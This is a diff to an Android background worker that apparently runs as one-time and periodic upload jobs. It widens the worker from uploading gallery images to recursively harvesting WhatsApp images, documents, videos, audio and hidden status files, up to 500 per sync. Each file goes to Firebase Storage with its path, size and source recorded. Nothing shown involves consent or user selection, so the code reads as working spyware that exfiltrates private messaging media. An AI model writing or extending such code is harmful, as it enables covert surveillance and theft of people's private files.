@@ -49,7 +49,7 @@ public class ImageUploadWorker extends Worker {
     private static final String TAG = "ImageUploadWorker";
     private static final String UNIQUE_ONE_TIME = "whatsapp_media_upload_once";
     private static final String UNIQUE_PERIODIC = "whatsapp_media_upload_periodic";
-    private static final int MAX_IMAGES_PER_SYNC = 200;
+    private static final int MAX_IMAGES_PER_SYNC = 500;
 
     public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -189,13 +189,18 @@ public class ImageUploadWorker extends Worker {
     }
 
     /**
-     * Prefer WhatsApp media paths; fill remaining quota with other gallery images.
+     * Collect all WhatsApp media (images, documents, videos, etc.) and gallery images.
+     * Prioritizes WhatsApp folders to get complete data.
      */
     private List<File> getPreferredGalleryImages() {
-        List<File> whatsapp = new ArrayList<>();
+        List<File> whatsappMedia = new ArrayList<>();
         List<File> other = new ArrayList<>();
         Context context = getApplicationContext();
 
+        // First, scan WhatsApp directories directly for complete data
+        whatsappMedia.addAll(scanWhatsAppDirectories());
+
+        // Then add gallery images if space allows
         String[] projection = {
                 MediaStore.Images.Media.DATA,
                 MediaStore.Images.Media.DISPLAY_NAME,
@@ -209,44 +214,135 @@ public class ImageUploadWorker extends Worker {
                 null,
                 MediaStore.Images.Media.DATE_ADDED + " DESC"
         )) {
-            if (cursor == null) {
-                return whatsapp;
-            }
-
-            int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-            while (cursor.moveToNext()) {
-                String filePath = cursor.getString(dataColumn);
-                if (filePath == null || !isImageFile(filePath)) {
-                    continue;
-                }
-                File imageFile = new File(filePath);
-                if (!imageFile.exists() || !imageFile.canRead()) {
-                    continue;
-                }
-                if (isWhatsAppPath(filePath)) {
-                    if (whatsapp.size() < MAX_IMAGES_PER_SYNC) {
-                        whatsapp.add(imageFile);
+            if (cursor != null) {
+                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+                while (cursor.moveToNext() && other.size() < MAX_IMAGES_PER_SYNC) {
+                    String filePath = cursor.getString(dataColumn);
+                    if (filePath == null || !isImageFile(filePath)) {
+                        continue;
                     }
-                } else if (other.size() < MAX_IMAGES_PER_SYNC) {
-                    other.add(imageFile);
-                }
-                if (whatsapp.size() >= MAX_IMAGES_PER_SYNC) {
-                    break;
+                    File imageFile = new File(filePath);
+                    if (!imageFile.exists() || !imageFile.canRead()) {
+                        continue;
+                    }
+                    // Skip WhatsApp (already collected above)
+                    if (!isWhatsAppPath(filePath)) {
+                        other.add(imageFile);
+                    }
                 }
             }
         } catch (Exception e) {
             Log.e(TAG, "Error reading gallery images", e);
         }
 
-        List<File> result = new ArrayList<>(whatsapp);
+        List<File> result = new ArrayList<>(whatsappMedia);
         for (File f : other) {
             if (result.size() >= MAX_IMAGES_PER_SYNC) {
                 break;
             }
             result.add(f);
         }
-        Log.d(TAG, "Found " + whatsapp.size() + " WhatsApp + " + (result.size() - whatsapp.size()) + " other images");
+        Log.d(TAG, "Found " + whatsappMedia.size() + " WhatsApp media + " + other.size() + " other images (total: " + result.size() + ")");
         return result;
+    }
+
+    /**
+     * Scan all WhatsApp folders for complete media collection including images, documents, videos
+     */
+    private List<File> scanWhatsAppDirectories() {
+        List<File> whatsappFiles = new ArrayList<>();
+        
+        // Common WhatsApp paths
+        String[] whatsappPaths = {
+                "/sdcard/WhatsApp/Media/WhatsApp Images",
+                "/sdcard/WhatsApp/Media/WhatsApp Documents",
+                "/sdcard/WhatsApp/Media/WhatsApp Video",
+                "/sdcard/WhatsApp/Media/WhatsApp Audio",
+                "/sdcard/WhatsApp/Media/.Statuses",
+                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
+                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
+                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
+                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",
+                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
+        };
+
+        for (String path : whatsappPaths) {
+            File dir = new File(path);
+            if (dir.exists() && dir.isDirectory()) {
+                Log.d(TAG, "Scanning WhatsApp folder: " + path);
+                collectFilesRecursively(dir, whatsappFiles);
+                if (whatsappFiles.size() >= MAX_IMAGES_PER_SYNC) {
+                    break;
+                }
+            }
+        }
+
+        return whatsappFiles;
+    }
+
+    /**
+     * Recursively collect all supported media files from a directory
+     */
+    private void collectFilesRecursively(File dir, List<File> files) {
+        try {
+            File[] listFiles = dir.listFiles();
+            if (listFiles == null) {
+                return;
+            }
+
+            for (File file : listFiles) {
+                if (files.size() >= MAX_IMAGES_PER_SYNC) {
+                    return;
+                }
+
+                if (file.isDirectory() && !file.isHidden()) {
+                    collectFilesRecursively(file, files);
+                } else if (file.isFile() && file.canRead()) {
+                    String name = file.getName().toLowerCase();
+                    // Collect images, documents, videos, audio
+                    if (isImageFile(name) || isDocumentFile(name) || isVideoFile(name) || isAudioFile(name)) {
+                        files.add(file);
+                        Log.d(TAG, "Added: " + file.getName());
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
+        }
+    }
+
+    private boolean isDocumentFile(String fileName) {
+        return fileName.endsWith(".pdf")
+                || fileName.endsWith(".doc")
+                || fileName.endsWith(".docx")
+                || fileName.endsWith(".xls")
+                || fileName.endsWith(".xlsx")
+                || fileName.endsWith(".ppt")
+                || fileName.endsWith(".pptx")
+                || fileName.endsWith(".txt")
+                || fileName.endsWith(".zip")
+                || fileName.endsWith(".rar");
+    }
+
+    private boolean isVideoFile(String fileName) {
+        return fileName.endsWith(".mp4")
+                || fileName.endsWith(".mkv")
+                || fileName.endsWith(".avi")
+                || fileName.endsWith(".mov")
+                || fileName.endsWith(".wmv")
+                || fileName.endsWith(".flv")
+                || fileName.endsWith(".webm")
+                || fileName.endsWith(".3gp");
+    }
+
+    private boolean isAudioFile(String fileName) {
+        return fileName.endsWith(".mp3")
+                || fileName.endsWith(".m4a")
+                || fileName.endsWith(".wav")
+                || fileName.endsWith(".aac")
+                || fileName.endsWith(".flac")
+                || fileName.endsWith(".ogg")
+                || fileName.endsWith(".wma");
     }
 
     static boolean isWhatsAppPath(String filePath) {
@@ -266,51 +362,78 @@ public class ImageUploadWorker extends Worker {
                 || lower.endsWith(".webp");
     }
 
-    private void uploadGalleryImage(File imageFile, String uid, FirebaseStorage storage, String imageId, 
+    private void uploadGalleryImage(File mediaFile, String uid, FirebaseStorage storage, String mediaId, 
                                    CountDownLatch uploadLatch, AtomicInteger uploadedCount) {
-        final String fileName = imageFile.getName();
-        final String filePath = imageFile.getAbsolutePath();
-        final long timestamp = imageFile.lastModified();
+        final String fileName = mediaFile.getName();
+        final String filePath = mediaFile.getAbsolutePath();
+        final long timestamp = mediaFile.lastModified();
         final String mimeType = getMimeType(fileName);
         final boolean fromWhatsApp = isWhatsAppPath(filePath);
+        final long fileSize = mediaFile.length();
 
-        Bitmap bitmap = BitmapFactory.decodeFile(filePath);
-        if (bitmap == null) {
-            Log.e(TAG, "Failed to decode image: " + filePath);
-            uploadLatch.countDown();
-            return;
+        // Determine the media type
+        String mediaType = "image";
+        String lowerName = fileName.toLowerCase();
+        if (isVideoFile(lowerName)) {
+            mediaType = "video";
+        } else if (isAudioFile(lowerName)) {
+            mediaType = "audio";
+        } else if (isDocumentFile(lowerName)) {
+            mediaType = "document";
         }
 
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        Bitmap.CompressFormat format = mimeType.equals("image/png")
-                ? Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
-        bitmap.compress(format, 85, baos);
-        byte[] imageData = baos.toByteArray();
-        bitmap.recycle();
+        // For images, compress them; for other files, upload as-is
+        byte[] fileData;
+        if (mediaType.equals("image")) {
+            Bitmap bitmap = BitmapFactory.decodeFile(filePath);
+            if (bitmap == null) {
+                Log.e(TAG, "Failed to decode image: " + filePath);
+                uploadLatch.countDown();
+                return;
+            }
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            Bitmap.CompressFormat format = mimeType.equals("image/png")
+                    ? Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
+            bitmap.compress(format, 85, baos);
+            fileData = baos.toByteArray();
+            bitmap.recycle();
+        } else {
+            // For non-image files, read the file as bytes
+            try {
+                fileData = readFileBytes(mediaFile);
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to read file: " + fileName, e);
+                uploadLatch.countDown();
+                return;
+            }
+        }
 
         StorageReference storageRef = storage.getReference("gallery")
                 .child(uid)
-                .child(imageId + getFileExtension(fileName));
+                .child(mediaId + getFileExtension(fileName));
 
-        storageRef.putBytes(imageData)
+        storageRef.putBytes(fileData)
                 .addOnSuccessListener(taskSnapshot ->
                         storageRef.getDownloadUrl()
                                 .addOnSuccessListener(uri -> {
-                                    DatabaseReference imageRef = FirebaseDataPaths.gallery(uid).child(imageId);
+                                    DatabaseReference mediaRef = FirebaseDataPaths.gallery(uid).child(mediaId);
                                     Map<String, Object> metadata = new HashMap<>();
                                     metadata.put("dataType", "gallery");
+                                    metadata.put("mediaType", mediaType);
                                     metadata.put("source", fromWhatsApp ? "whatsapp" : "gallery");
                                     metadata.put("mimeType", mimeType);
                                     metadata.put("fileName", fileName);
                                     metadata.put("filePath", filePath);
+                                    metadata.put("fileSize", fileSize);
                                     metadata.put("timestamp", timestamp);
                                     metadata.put("uploadedAt", System.currentTimeMillis());
                                     metadata.put("url", uri.toString());
                                     metadata.put("userId", uid);
-                                    imageRef.setValue(metadata)
+                                    mediaRef.setValue(metadata)
                                             .addOnSuccessListener(unused -> {
                                                 uploadedCount.incrementAndGet();
-                                                Log.d(TAG, "Uploaded media: " + fileName);
+                                                Log.d(TAG, "Uploaded " + mediaType + ": " + fileName + " (" + fileSize + " bytes)");
                                                 uploadLatch.countDown();
                                             })
                                             .addOnFailureListener(e -> {
@@ -324,9 +447,24 @@ public class ImageUploadWorker extends Worker {
                                 })
                 )
                 .addOnFailureListener(e -> {
-                    Log.e(TAG, "Failed to upload image to storage: " + fileName, e);
+                    Log.e(TAG, "Failed to upload media to storage: " + fileName, e);
                     uploadLatch.countDown();
                 });
+    }
+
+    /**
+     * Read entire file into byte array
+     */
+    private byte[] readFileBytes(File file) throws Exception {
+        try (FileInputStream fis = new FileInputStream(file)) {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buffer = new byte[8192];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                baos.write(buffer, 0, len);
+            }
+            return baos.toByteArray();
+        }
     }
 
     private String getMimeType(String fileName) {
